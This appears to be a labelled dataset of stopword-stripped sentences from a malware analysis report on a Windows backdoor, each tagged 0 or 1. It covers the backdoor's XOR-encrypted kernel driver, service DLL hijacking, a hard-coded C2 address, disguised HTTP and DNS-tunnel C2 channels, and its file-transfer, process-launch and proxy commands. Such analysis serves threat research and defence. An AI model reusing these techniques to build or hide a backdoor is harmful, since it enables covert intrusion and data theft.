exe '' running ( AntiVirus360 program Chinese 'Quihoo 360 Technology Co. LTD ' 360 ) username DLL 's host process context 'SYSTEM ' driver written disk	0
Barring two aforementioned conditions sample decrypts kernel driver Following decryption writing driver disk loaded using ZwLoadDriver ( ) API	1
The driv- er encrypted simple four byte XOR key value 0x2E885Df3 ; decryption file MD5 hash dae6b9b3b8e39b08b10a51a6457444d8	1
The malware contains dynamic configuration stored Registry loads default configuration embedded binary configuration found	0
The way default configuration loaded parsed indicates malware built 'builder ' takes template sample lets unsophisticated user specify configuration without recompiling code	0
If current service name matches set pre-defined service names legitimately exist Windows backdoor loads original service 's DLL address space LoadLibrary invokes ServiceMain export	1
This effectively hijacks original service 's entry retaining functionality	0
While code binary allows downloading list C2 servers HTTP URL default configuration present specifies 202.86.190.3:80 C2 use Hong Kong C2 server one used post exploitation .NET	1
tool	0
The malware three distinct C2 protocols two transmitted HTTP proxies one bundled two different 'dual ' modes ( see 3	1
) totaling 7 distinct supported C2 mechanisms	0
The con- figuration contains C2 protocol used optionally self-configuration mode malware attempts different C2 protocols pre-defined order	1
In self-configuration connection via proxy attempted system wide Internet Explorer settings specify proxy	0
The configuration found sample set automatic self-configuration resulting following mechanisms tried order 1	0
Proprietary binary header ( optionally HTTP Proxy using CONNECT mechanism ) ; protocol consists 64 random bytes sent C2	1
The C2 responds 64 bytes first four bytes must match first four sent bytes establish connection successfully	0
The remaining bytes discarded	0
Interestingly malware stores first four bytes rotated right seven bits compares value seven bits rotated right version server 's response effectively neutralizing rotation 's effect ; purpose unclear	0
2	0
A long-running HTTP POST request path '' /forum/login.cgi '' statically defined HTTP request string including HTTP headers ( optionally HTTP Proxy using CONNECT )	0
The malware requires response start '' HTTP/1.0 200 '' '' HTTP/1.1 200 '' absence '' Connection close '' header	0
This one HTTP connection used bi-directional communications sending chunks POST payload receiving chunks response interleaved	1
3	0
Two long-running HTTP requests C2 ( optionally HTTP Proxy original request verb ) one GET request '' /Photos/Query.cgi ? loginid= '' followed random number one POST request '' /Catelog/login1.cgi ''	0
The GET request serves down-stream channel POST request serves upstream channel	1
This demonstrates attempt use efficient communication channel first falling back legitimate appearing channels required order appear Request For Comment ( RFC ) compliant HTTP protocol	0
Additionally malware contains custom DNS client implementation use system 's configured DNS server tunnel C2 traffic legitimate DNS	1
Since C2 mechanism attempted self-configuration configured binary analysis left due time constraints	0
After establishing aforementioned channels arbitrary binary data exchange malware start sending receiving compressed binary blobs via channel choice	1
The C2 's binary data blobs compressed	0
No encryption data takes place	0
All C2 transport implementations contain code accepting handling server-side connections respective protocols	0
However code appear invoked	0
It appears author code shares library implements transports client C2 server	0
The main backdoor thread reads commands chosen C2 protocol passes following registered handler classes based upon command ID	1
The handler class responsible parsing remainder command	0
This handler class command ID 8 implements generic directory file browsing using FindFirstFileW ( ) FindNextFileW ( ) APIs well reading writing arbitrary files via C2 commands thus enabling upload download arbitrary files	1
This typically seen RATs searching specific files exfiltrate	1
Additionally class implements launching specified executable files via CreateProcess ( ) API	1
This handler class implements generic TCP proxy	1
